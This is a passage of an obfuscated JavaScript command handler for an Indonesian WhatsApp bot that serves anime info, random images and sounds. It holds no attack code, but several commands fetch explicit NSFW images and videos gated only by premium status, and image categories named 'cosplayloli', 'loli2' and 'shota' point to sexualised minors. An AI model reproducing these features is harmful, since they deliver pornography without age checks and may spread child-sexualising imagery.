              'caption': "🎌 *Quote Anime* 🎌\n\n" + ("🗣️ *Karakter*: " + (_0x5d49ac.karakter || '-') + "\n") + ("📺 *Anime*: " + (_0x5d49ac.anime || '-') + "\n") + ("🎬 *Episode*: " + (_0x5d49ac.episode || '-') + "\n") + ("📅 *Diunggah*: " + (_0x5d49ac.up_at || '-') + "\n\n") + ("💬 *Quote*: \"" + (_0x5d49ac.quotes || '-') + "\"\n\n") + ("🔗 *Sumber*: " + _0x5d49ac.link)
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0xaf6c59) {
            console.error(_0xaf6c59);
            await _0x3a091f("❌ Wah, ada kesalahan waktu ambil quote anime nih, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "anime":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ *Judul anime-nya mana, Kak?* Coba ketik nama anime yang mau dicari ya! 🫣");
          }
          const _0x20e1b6 = require("mal-scraper");
          await _0x3a091f("⏳ *Tunggu sebentar ya, KoKoRey lagi cari datanya...* 📚✨");
          const _0x331e47 = await _0x20e1b6.getInfoFromName(_0x2b2627)["catch"](() => null);
          if (!_0x331e47) {
            return _0x3a091f("❌ *Yahh, anime yang Kamu cari gak ketemu...* 🥺 Coba ketik judul yang lebih spesifik ya!");
          }
          let _0x1069e4 = "🎀 *《 𝗜𝗡𝗙𝗢 𝗔𝗡𝗜𝗠𝗘 》* 🎀\n\n📚 *Judul*: " + _0x331e47.title + "\n🎭 *Tipe*: " + _0x331e47.type + "\n📅 *Tayang Perdana*: " + (_0x331e47.premiered || '-') + "\n🎬 *Total Episode*: " + (_0x331e47.episodes || '-') + "\n📈 *Status*: " + (_0x331e47.status || '-') + "\n💠 *Genre*: " + (_0x331e47.genres || '-') + "\n🏢 *Studio*: " + (_0x331e47.studios || '-') + "\n⭐ *Skor*: " + (_0x331e47.score || '-') + "\n🔖 *Rating*: " + (_0x331e47.rating || '-') + "\n🏅 *Peringkat*: " + (_0x331e47.ranked || '-') + "\n🔥 *Popularitas*: " + (_0x331e47.popularity || '-') + "\n🎥 *Trailer*: " + (_0x331e47.trailer || '-') + "\n🌐 *Link MAL*: " + (_0x331e47.url || '-') + "\n📝 *Deskripsi*: " + (_0x331e47.synopsis || "Tidak ada deskripsi tersedia.") + "\n\n✨ *Selamat menikmati info animenya, Kak!* 😊🎌";
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'image': {
              'url': _0x331e47.picture || imageUrl
            },
            'caption': _0x1069e4
          }, {
            'quoted': _0x3f87c6
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'waifu':
      case 'neko':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x3632cf = await fetchJson("https://api.waifu.pics/sfw/" + _0x4ac520);
          _0x3f87c6.reply({
            'image': {
              'url': _0x3632cf.url
            },
            'caption': "Nih Kak " + _0xdd1e8d + ", " + _0x4ac520 + "-nya 😋☕",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + "menu",
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
        }
        ;
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "bluearchive":
      case "randombluearchive":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x1e3203 = await fetchJson("https://api.siputzx.my.id/api/r/blue-archive");
          _0x3f87c6.reply({
            'image': {
              'url': _0x1e3203.url
            },
            'caption': "Nih Kak " + _0xdd1e8d + ", Random Blue Archive-nya 😋☕",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + "menu",
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
        }
        ;
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "hwaifu":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x543566 = await fetchJson("https://api.waifu.pics/nsfw/waifu");
          _0x3f87c6.reply({
            'image': {
              'url': _0x543566.url
            },
            'caption': "⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + 'menu',
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "hneko":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x4b5c2f = await fetchJson("https://api.waifu.pics/nsfw/neko");
          _0x3f87c6.reply({
            'image': {
              'url': _0x4b5c2f.url
            },
            'caption': "⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + 'menu',
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "trap":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x472aba = await fetchJson("https://api.waifu.pics/nsfw/" + _0x4ac520);
          _0x3f87c6.reply({
            'image': {
              'url': _0x472aba.url
            },
            'caption': "⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + "menu",
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "blowjob":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x21909b = await fetchJson("https://api.waifu.pics/nsfw/" + _0x4ac520);
          _0x3f87c6.reply({
            'image': {
              'url': _0x21909b.url
            },
            'caption': "⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + 'menu',
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "hentai":
      case "hentai-video":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          await _0x3f87c6.react('⏱️');
          const _0x17e660 = await hentai();
          _0x3f87c6.reply({
            'video': {
              'url': _0x17e660[0x0].video_1
            },
            'caption': "⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHai, Kak! Ingat ya, konten ini ditujukan untuk pengguna yang sudah cukup umur dan harus digunakan dengan penuh kesadaran. Jangan sampai lupa waktu dan tanggung jawab gara-gara konten ini! 🕒💡\n\nKalau udah mulai merasa keterusan, istirahat dulu ya. Kesehatan mental dan fisik tetap nomor satu! 🌟",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + "menu",
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "wallhp":
      case "akira":
      case 'akiyama':
      case "ana":
      case "art":
      case "asuna":
      case "ayuzawa":
      case "boruto":
      case "bts":
      case 'chiho':
      case "chitoge":
      case 'cosplay':
      case "cosplayloli":
      case 'cosplaysagiri':
      case 'cyber':
      case "deidara":
      case 'doraemon':
      case "elaina":
      case 'emilia':
      case "erza":
      case 'exo':
      case "gamewallpaper":
      case "gremory":
      case "hacker":
      case 'hestia':
      case "Husbu":
      case 'inori':
      case "islamic":
      case 'isuzu':
      case "itachi":
      case 'itori':
      case "jennie":
      case 'jiso':
      case 'justina':
      case "kaga":
      case "kagura":
      case "kakasih":
      case "kaori":
      case "cartoon":
      case "shortquote":
      case "keneki":
      case "kotori":
      case "kurumi":
      case "lisa":
      case 'loli2':
      case "madara":
      case "megumin":
      case "mikasa":
      case "mikey":
      case "miku":
      case "minato":
      case "mountain":
      case "naruto":
      case "nekonime":
      case "nezuko":
      case "onepiece":
      case "pentol":
      case "pokemon":
      case 'programming':
      case "randomnime":
      case "randomnime2":
      case "rize":
      case 'rose':
      case 'sagiri':
      case 'sakura':
      case "sasuke":
      case "satanic":
      case "shina":
      case "shinka":
      case "shinomiya":
      case "shizuka":
      case "shota":
      case "space":
      case "technology":
      case 'tejina':
      case "toukachan":
      case "tsunade":
      case "waifu2":
      case "yotsuba":
      case 'yuki':
      case "yulibocil":
      case "yumeko":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          let _0x1a21c9;
          if (/akira/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/akira.json");
          }
          if (/akiyama/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/akiyama.json');
          }
          if (/ana/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/ana.json');
          }
          if (/art/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/art.json");
          }
          if (/asuna/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/asuna.json");
          }
          if (/ayuzawa/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/ayuzawa.json");
          }
          if (/boneka/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/boneka.json");
          }
          if (/boruto/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/boruto.json");
          }
          if (/bts/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/bts.json");
          }
          if (/cecan/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/cecan.json");
          }
          if (/chiho/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/chiho.json");
          }
          if (/chitoge/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/chitoge.json');
          }
          if (/cogan/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/cogan.json");
          }
          if (/cosplay/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/cosplay.json");
          }
          if (/cosplayloli/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/cosplayloli.json');
          }
          if (/cosplaysagiri/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/cosplaysagiri.json");
          }
          if (/cyber/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/cyber.json");
          }
          if (/deidara/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/deidara.json");
          }
          if (/doraemon/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/doraemon.json");
          }
          if (/eba/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/eba.json');
          }
          if (/elaina/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/elaina.json");
          }
          if (/emilia/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/emilia.json");
          }
          if (/erza/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/erza.json");
          }
          if (/exo/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/exo.json");
          }
          if (/femdom/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/femdom.json');
          }
          if (/freefire/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/freefire.json");
          }
          if (/gamewallpaper/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/gamewallpaper.json');
          }
          if (/glasses/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/glasses.json");
          }
          if (/gremory/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/gremory.json");
          }
          if (/hacker/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/hekel.json");
          }
          if (/hestia/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/hestia.json");
          }
          if (/Husbu/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/Husbu.json");
          }
          if (/inori/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/inori.json");
          }
          if (/islamic/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/islamic.json");
          }
          if (/isuzu/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/isuzu.json');
          }
          if (/itachi/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/itachi.json");
          }
          if (/itori/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/itori.json");
          }
          if (/jennie/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/jeni.json');
          }
          if (/jiso/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/jiso.json");
          }
          if (/justina/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/justina.json");
          }
          if (/kaga/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/kaga.json');
          }
          if (/kagura/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/kagura.json");
          }
          if (/kakasih/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/kakasih.json");
          }
          if (/kaori/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/kaori.json');
          }
          if (/cartoon/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/kartun.json");
          }
          if (/shortquote/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/kataNya.json");
          }
          if (/keneki/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/keneki.json");
          }
          if (/kotori/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/kotori.json');
          }
          if (/kpop/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/kpop.json");
          }
          if (/kucing/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/kucing.json');
          }
          if (/kurumi/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/kurumi.json');
          }
          if (/lisa/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/lisa.json");
          }
          if (/loli2/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/loli.json');
          }
          if (/madara/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/madara.json");
          }
          if (/megumin/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/megumin.json");
          }
          if (/mikasa/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/mikasa.json");
          }
          if (/mikey/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/mikey.json");
          }
          if (/miku/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/miku.json');
          }
          if (/minato/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/minato.json');
          }
          if (/mobile/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/mobil.json");
          }
          if (/motor/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/motor.json");
          }
          if (/mountain/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/mountain.json");
          }
          if (/naruto/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/naruto.json');
          }
          if (/nekonime/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/nekonime.json");
          }
          if (/nezuko/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/nezuko.json");
          }
          if (/onepiece/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/onepiece.json');
          }
          if (/pentol/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/pentol.json");
          }
          if (/pokemon/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/pokemon.json");
          }
          if (/profil/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/profil.json");
          }
          if (/progamming/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/programming.json");
          }
          if (/pubg/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/pubg.json");
          }
          if (/randblackpink/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/randblackpink.json');
          }
          if (/randomnime/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/randomnime.json');
          }
          if (/randomnime2/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/randomnime2.json");
          }
          if (/rize/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/rize.json");
          }
          if (/rose/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/rose.json');
          }
          if (/ryujin/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/ryujin.json');
          }
          if (/sagiri/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/sagiri.json");
          }
          if (/sakura/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/sakura.json');
          }
          if (/sasuke/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/sasuke.json");
          }
          if (/satanic/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/satanic.json");
          }
          if (/shina/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/shina.json");
          }
          if (/shinka/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/shinka.json");
          }
          if (/shinomiya/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/shinomiya.json");
          }
          if (/shizuka/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/shizuka.json");
          }
          if (/shota/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/shota.json");
          }
          if (/space/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/tatasurya.json');
          }
          if (/technology/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/technology.json");
          }
          if (/tejina/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/tejina.json");
          }
          if (/toukachan/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/Media/master/toukachan.json');
          }
          if (/tsunade/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/tsunade.json");
          }
          if (/waifu2/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/waifu.json");
          }
          if (/wallhp/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/wallhp.json");
          }
          if (/wallml/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/wallml.json");
          }
          if (/wallmlnime/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/wallnime.json");
          }
          if (/yotsuba/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/yotsuba.json");
          }
          if (/yuki/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/yuki.json");
          }
          if (/yulibocil/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/yulibocil.json");
          }
          if (/yumeko/.test(_0x4ac520)) {
            _0x1a21c9 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/Media/master/yumeko.json");
          }
          const _0x22ffe4 = _0x1a21c9[Math.floor(Math.random() * _0x1a21c9.length)];
          const _0x9f6e4f = await getBuffer(_0x22ffe4);
          _0x3f87c6.reply({
            'image': _0x9f6e4f,
            'caption': "Nih Kak " + _0xdd1e8d + ", " + _0x4ac520 + "-nya 😋☕",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520,
              'buttonText': {
                'displayText': "🔄 Lanjut Lagi"
              }
            }, {
              'buttonId': _0x4773c6 + "menu",
              'buttonText': {
                'displayText': "📜 Kembali ke Menu"
              }
            }],
            'viewOnce': true
          });
        }
        ;
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case 'sound5':
      case "sound6":
      case 'sound7':
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case 'sound16':
      case "sound17":
      case 'sound18':
      case 'sound19':
      case "sound20":
      case "sound21":
      case "sound22":
      case 'sound23':
      case 'sound24':
      case 'sound25':
      case "sound26":
      case "sound27":
      case "sound28":
      case 'sound29':
      case "sound30":
      case "sound31":
      case 'sound32':
      case "sound33":
      case "sound34":
      case 'sound35':
      case "sound36":
      case 'sound37':
      case "sound38":
      case "sound39":
      case 'sound40':
      case 'sound41':
      case 'sound42':
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case 'sound51':
      case "sound52":
      case "sound53":
      case 'sound54':
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case 'sound73':
      case "sound74":
      case 'sound75':
      case 'sound76':
      case 'sound77':
      case 'sound78':
      case "sound79":
      case 'sound80':
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case 'sound85':
      case "sound86":
      case "sound87":
      case "sound88":
      case 'sound89':
      case 'sound90':
      case 'sound91':
      case "sound92":
      case "sound93":
      case "sound94":
      case 'sound95':
      case "sound96":
      case "sound97":
      case 'sound98':
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case 'sound103':
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case 'sound109':
      case "sound110":
      case "sound111":
      case 'sound112':
      case 'sound113':
      case "sound114":
      case "sound115":
      case 'sound116':
      case "sound117":
      case "sound118":
